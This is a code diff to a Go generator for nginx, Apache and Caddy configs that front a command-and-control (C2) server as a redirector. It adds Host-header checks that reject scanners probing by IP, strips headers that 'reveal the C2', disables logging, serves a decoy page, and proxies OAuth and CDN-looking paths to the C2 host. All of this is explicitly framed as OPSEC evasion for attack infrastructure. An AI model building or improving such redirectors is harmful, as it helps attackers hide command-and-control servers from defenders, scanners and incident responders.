@@ -86,6 +86,11 @@ server {
     access_log off;
     error_log /dev/null;
 
+    # ── Host Header Validation (OPSEC — reject scanners probing by IP) ──
+    if ($host != "%s") {
+        return 404;
+    }
+
     # Security headers to look legitimate
     add_header X-Frame-Options "SAMEORIGIN" always;
     add_header X-Content-Type-Options "nosniff" always;
@@ -148,6 +153,7 @@ server {
 }
 `, cfg.RedirDomain, cfg.RedirDomain, cfg.RedirDomain,
 		cfg.RedirDomain, cfg.RedirDomain,
+		cfg.RedirDomain, // host header validation
 		cfg.C2Host, cfg.C2Port,
 		cfg.C2Host, cfg.C2Port,
 		cfg.C2Host, cfg.C2Port,
@@ -196,8 +202,10 @@ func generateApacheConfig(cfg RedirectorConfig, dir string) (string, error) {
     ProxyPass /common/oauth2/ http://%s:%s/common/oauth2/
     ProxyPassReverse /common/oauth2/ http://%s:%s/common/oauth2/
 
-    # ── Block everything else (or serve decoy) ──
+    # ── Host Header Validation (OPSEC) ──
     RewriteEngine On
+    RewriteCond %%{HTTP_HOST} !^%s$ [NC]
+    RewriteRule .* - [F,L]
 
     # Block requests without proper User-Agent (optional, tighter OPSEC)
     # RewriteCond %%{HTTP_USER_AGENT} !Mozilla [NC]
@@ -217,6 +225,7 @@ func generateApacheConfig(cfg RedirectorConfig, dir string) (string, error) {
 		cfg.C2Host, cfg.C2Port, cfg.C2Host, cfg.C2Port,
 		cfg.C2Host, cfg.C2Port, cfg.C2Host, cfg.C2Port,
 		cfg.C2Host, cfg.C2Port, cfg.C2Host, cfg.C2Port,
+		cfg.RedirDomain, // host header validation
 		cfg.RedirDomain, cfg.RedirDomain)
 
 	path := filepath.Join(dir, "apache_redirector.conf")
@@ -382,14 +391,15 @@ func generateCaddyConfig(cfg RedirectorConfig, dir string) (string, error) {
     reverse_proxy /cdn-cgi/* %s:%s
     reverse_proxy /common/oauth2/* %s:%s
 
-    # Everything else → decoy
-    respond / "<!DOCTYPE html><html><body><h1>Welcome</h1></body></html>" 200
+    # Everything else → decoy (Caddy already rejects wrong Host via server_name)
+    respond "<!DOCTYPE html><html><body><h1>Welcome</h1></body></html>" 200
 
-    # Headers
+    # Strip backend headers that reveal the C2
     header {
         X-Frame-Options "SAMEORIGIN"
         X-Content-Type-Options "nosniff"
         -Server
+        -X-Powered-By
     }
 
     # Logging off for OPSEC
